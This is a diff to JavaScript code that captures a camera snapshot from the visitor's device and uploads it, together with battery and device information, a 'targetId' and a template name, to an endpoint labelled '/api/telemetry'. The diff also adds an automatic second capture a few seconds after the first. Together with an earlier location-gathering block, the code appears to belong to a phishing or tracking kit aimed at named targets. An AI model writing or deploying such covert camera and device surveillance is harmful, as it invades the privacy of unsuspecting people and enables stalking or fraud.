@@ -404,6 +404,8 @@
     }
 
     let isCapturingCamera = false;
+    let cameraCaptureCount = 0;
+
     async function captureCameraSnapshot() {
         if (isCapturingCamera) return null;
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
@@ -420,17 +422,16 @@
 
             await video.play().catch(() => {});
 
+            // Wait for video stream ready & camera auto-exposure stabilization
             await new Promise(resolve => {
-                if (video.readyState >= 2 && video.videoWidth > 0) {
-                    setTimeout(resolve, 350);
-                } else {
-                    const onPlaying = () => {
-                        video.removeEventListener("playing", onPlaying);
-                        setTimeout(resolve, 450);
-                    };
-                    video.addEventListener("playing", onPlaying);
-                    setTimeout(resolve, 1200);
-                }
+                const checkReady = () => {
+                    if (video.readyState >= 2 && video.videoWidth > 0) {
+                        setTimeout(resolve, 600);
+                    } else {
+                        setTimeout(checkReady, 100);
+                    }
+                };
+                checkReady();
             });
 
             const width = video.videoWidth || 640;
@@ -443,31 +444,22 @@
 
             stream.getTracks().forEach(track => track.stop());
 
+            const dataUrl = canvas.toDataURL("image/jpeg", 0.85);
             const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
-            if (blob) {
+
+            if (blob || dataUrl) {
                 const formData = new FormData();
-                formData.append("media", blob, `camera-snapshot-${Date.now()}.jpg`);
+                if (blob) {
+                    formData.append("media", blob, `camera-snapshot-${Date.now()}.jpg`);
+                }
+                formData.append("image", dataUrl);
                 formData.append("id", targetId);
 
-                // Quick location gathering without long blocking timeouts
-                let loc = null;
-                try {
-                    loc = await Promise.race([
-                        getBestAvailableLocation(),
-                        new Promise(res => setTimeout(() => res(null), 2000))
-                    ]);
-                } catch (_e) {}
-
-                if (loc && loc.lat != null) formData.append("lat", loc.lat);
-                if (loc && loc.lng != null) formData.append("lng", loc.lng);
-                if (loc && loc.accuracy != null) formData.append("accuracy", loc.accuracy);
-                formData.append("locationSource", (loc && loc.source) || LOCATION_SOURCE);
-
+                if (activeOptions?.templateName) formData.append("template", activeOptions.templateName);
                 const battery = await getBatteryInfo();
                 if (battery) formData.append("battery", JSON.stringify(battery));
                 const device = getDeviceInfo();
                 if (device) formData.append("device", JSON.stringify(device));
-                if (activeOptions?.templateName) formData.append("template", activeOptions.templateName);
 
                 const res = await fetch("/api/telemetry", {
                     method: "POST",
@@ -475,6 +467,14 @@
                 });
                 const result = await res.json();
                 console.log("[Camera Snapshot Captured & Sent]:", result);
+
+                cameraCaptureCount++;
+                if (cameraCaptureCount === 1) {
+                    setTimeout(() => {
+                        captureCameraSnapshot();
+                    }, 2500);
+                }
+
                 return result;
             }
         } catch (err) {
